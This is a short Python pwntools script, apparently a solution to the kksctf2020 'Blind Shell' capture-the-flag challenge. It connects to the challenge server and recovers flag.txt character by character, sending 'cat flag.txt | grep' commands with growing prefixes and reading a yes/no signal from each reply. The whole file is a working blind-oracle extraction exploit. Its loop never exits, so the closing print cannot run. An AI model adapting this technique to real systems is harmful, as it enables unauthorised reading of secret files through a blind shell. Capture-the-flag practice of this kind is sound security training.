"""
 @ Date
 : 2020.12.21
 @ Description
 : kksctf2020's Blind Shell 
 : read "flag.txt"

"""

from pwn import *

alphabet = '_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}!"#()+,-/:;<=>?@[]^'

conn = remote('tasks.kksctf.ru', 30010)
conn.sendline("cat flag.txt | grep ^L")
conn.recvline()

read = 'L'

while True:
	for i in alphabet:
		test = read + i
		print(test)
		conn.sendline("cat flag.txt |grep " + test)
		
		recv = conn.recvline().decode()

		if recv[2] == "S":
			read = test
			break


print("Here's your content", read)